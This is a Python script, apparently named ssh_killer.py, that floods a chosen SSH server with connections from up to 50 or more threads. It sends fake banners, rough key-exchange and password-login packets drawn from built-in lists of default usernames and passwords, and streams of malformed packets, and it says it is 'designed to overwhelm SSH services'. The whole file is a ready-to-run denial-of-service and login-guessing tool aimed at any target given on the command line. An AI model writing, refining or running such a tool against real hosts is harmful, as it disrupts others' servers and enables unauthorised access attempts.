import socket
import sys
import time
import random
import threading
import paramiko
import ssl
import struct
import hashlib

class SSHKillerBypass:
    def __init__(self, target_ip, port, duration, max_threads=50):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.max_threads = max_threads
        self.running = True
        self.connection_count = 0
        
        # SSH protocol versions and software banners
        self.ssh_versions = [
            "SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1",
            "SSH-2.0-OpenSSH_7.9p1 Debian-10",
            "SSH-2.0-OpenSSH_7.4p1 Raspbian-10",
            "SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1",
            "SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7",
            "SSH-2.0-dropbear_2019.78",
            "SSH-2.0-libssh_0.8.5",
            "SSH-2.0-PuTTY_Release_0.74"
        ]
        
        # Common usernames for brute force simulation
        self.usernames = [
            'root', 'admin', 'ubuntu', 'debian', 'centos', 
            'test', 'user', 'guest', 'administrator', 'pi',
            'oracle', 'mysql', 'postgres', 'nginx', 'apache'
        ]
        
        # Common passwords for authentication attempts
        self.passwords = [
            'password', '123456', 'admin', 'root', 'test',
            'password123', 'qwerty', 'letmein', 'welcome',
            'ubuntu', 'debian', 'centos', 'raspberry'
        ]

    def generate_ssh_banner(self):
        """Generate realistic SSH banner"""
        return random.choice(self.ssh_versions) + "\r\n"

    def create_ssh_kex_packet(self):
        """Create SSH key exchange packet"""
        # SSH packet structure: length, padding, type, data
        packet_type = 20  # SSH_MSG_KEXINIT
        cookie = random.randbytes(16)
        
        # Key exchange algorithms
        kex_algorithms = [
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group14-sha256",
            "diffie-hellman-group1-sha1"
        ]
        
        # Build KEXINIT packet
        payload = bytearray()
        payload.extend(cookie)
        payload.extend(struct.pack('>I', len(kex_algorithms[0])))
        payload.extend(kex_algorithms[0].encode())
        
        # Random padding to vary packet size
        padding = random.randbytes(random.randint(8, 32))
        payload.extend(padding)
        
        return payload

    def create_ssh_auth_packet(self, username, password):
        """Create SSH authentication packet"""
        # SSH userauth request
        service_name = "ssh-connection"
        method_name = "password"
        
        payload = bytearray()
        payload.extend(struct.pack('>I', len(service_name)))
        payload.extend(service_name.encode())
        payload.extend(struct.pack('>I', len(username)))
        payload.extend(username.encode())
        payload.extend(struct.pack('>I', len(method_name)))
        payload.extend(method_name.encode())
        payload.extend(struct.pack('>I', len(password)))
        payload.extend(password.encode())
        
        return payload

    def create_ssh_channel_packet(self):
        """Create SSH channel open packet"""
        channel_type = "session"
        payload = bytearray()
        payload.extend(struct.pack('>I', len(channel_type)))
        payload.extend(channel_type.encode())
        payload.extend(struct.pack('>I', random.randint(1000, 9999)))  # sender channel
        payload.extend(struct.pack('>I', 0x200000))  # initial window size
        payload.extend(struct.pack('>I', 0x4000))    # maximum packet size
        
        return payload

    def ssh_protocol_attack(self, sock):
        """Perform full SSH protocol attack"""
        try:
            # Send SSH banner
            banner = self.generate_ssh_banner()
            sock.send(banner.encode())
            time.sleep(0.1)
            
            # Receive server banner (if any)
            try:
                sock.recv(1024)
            except:
                pass
            
            # Send key exchange initiation
            kex_packet = self.create_ssh_kex_packet()
            sock.send(kex_packet)
            time.sleep(0.05)
            
            # Multiple authentication attempts
            for _ in range(random.randint(3, 8)):
                username = random.choice(self.usernames)
                password = random.choice(self.passwords)
                auth_packet = self.create_ssh_auth_packet(username, password)
                sock.send(auth_packet)
                time.sleep(random.uniform(0.01, 0.1))
                
                # Occasionally read response
                if random.random() > 0.6:
                    try:
                        sock.recv(512)
                    except:
                        pass
            
            # Channel operations
            for _ in range(random.randint(2, 5)):
                channel_packet = self.create_ssh_channel_packet()
                sock.send(channel_packet)
                time.sleep(0.03)
                
        except:
            pass

    def ssh_raw_flood(self, sock):
        """Raw SSH protocol flood with malformed packets"""
        # Malformed SSH packet types
        malformed_types = [0, 255, 127, 128, 200]  # Invalid SSH message types
        
        for _ in range(random.randint(10, 30)):
            try:
                # Create malformed packet
                packet_type = random.choice(malformed_types)
                packet_length = random.randint(50, 500)
                
                packet = bytearray()
                packet.extend(struct.pack('>I', packet_length))
                packet.append(packet_type)
                packet.extend(random.randbytes(packet_length - 1))
                
                sock.send(packet)
                time.sleep(random.uniform(0.001, 0.01))
                
            except:
                break

    def ssh_connection_flood(self, thread_id):
        """Main SSH flood attack worker"""
        attack_modes = ['protocol', 'raw', 'banner', 'mixed']
        
        try:
            start_time = time.time()
            
            while self.running and time.time() - start_time < self.duration:
                try:
                    # Create socket with various options
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.settimeout(random.uniform(2.0, 5.0))
                    
                    # Random TTL variation
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.randint(32, 255))
                    
                    # Connect to SSH port
                    sock.connect((self.target_ip, self.port))
                    self.connection_count += 1
                    
                    # Choose random attack mode
                    attack_mode = random.choice(attack_modes)
                    
                    if attack_mode == 'protocol':
                        self.ssh_protocol_attack(sock)
                    elif attack_mode == 'raw':
                        self.ssh_raw_flood(sock)
                    elif attack_mode == 'banner':
                        # Banner flood only
                        for _ in range(random.randint(20, 50)):
                            banner = self.generate_ssh_banner()
                            sock.send(banner.encode())
                            time.sleep(0.01)
                    else:  # mixed
                        self.ssh_protocol_attack(sock)
                        self.ssh_raw_flood(sock)
                    
                    sock.close()
                    
                    # Random delay between connections
                    time.sleep(random.uniform(0.02, 0.1))
                    
                except (socket.timeout, socket.error, ConnectionRefusedError, ConnectionResetError):
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(random.uniform(0.1, 0.3))
                    
        except Exception as e:
            pass

    def start_attack(self):
        """Start the SSH killer attack"""
        print(f"Starting SSH Killer Bypass Attack")
        print(f"Target: {self.target_ip}:{self.port}")
        print(f"Duration: {self.duration} seconds")
        print(f"Threads: {self.max_threads}")
        print("Attack Modes: Protocol, Raw, Banner, Mixed")
        print("Bypass Techniques: TTL variation, protocol obfuscation")
        print("Designed to overwhelm SSH services")
        print("Press Ctrl+C to stop\n")
        
        threads = []
        for i in range(self.max_threads):
            thread = threading.Thread(target=self.ssh_connection_flood, args=(i,), daemon=True)
            threads.append(thread)
            thread.start()
        
        try:
            start_time = time.time()
            last_count = 0
            
            while time.time() - start_time < self.duration and self.running:
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                
                # Calculate connections per second
                current_count = self.connection_count
                cps = current_count - last_count
                last_count = current_count
                
                print(f"\rTime: {elapsed}s | Remaining: {remaining}s | Connections: {current_count} | CPS: {cps}/s", 
                      end="", flush=True)
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\nStopping attack...")
        finally:
            self.running = False
            for thread in threads:
                thread.join(timeout=2)
            
            print(f"\nAttack completed.")
            print(f"Total connections attempted: {self.connection_count}")
            print(f"Average connections per second: {self.connection_count / self.duration:.1f}")

def main():
    if len(sys.argv) not in [4, 5]:
        print("Usage: python ssh_killer.py <IP> <PORT> <DURATION> [THREADS]")
        print("Example: python ssh_killer.py 192.168.1.1 22 300")
        print("Example: python ssh_killer.py 192.168.1.1 2222 600 100")
        return 1

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    max_threads = int(sys.argv[4]) if len(sys.argv) == 5 else 50

    if port not in [22, 2222, 222, 2022]:
        print("   Warning: SSH typically runs on ports 22, 2222, 222, 2022")
        print("   The attack will proceed anyway...\n")

    killer = SSHKillerBypass(target_ip, port, duration, max_threads)
    killer.start_attack()
    return 0

if __name__ == "__main__":
    sys.exit(main())
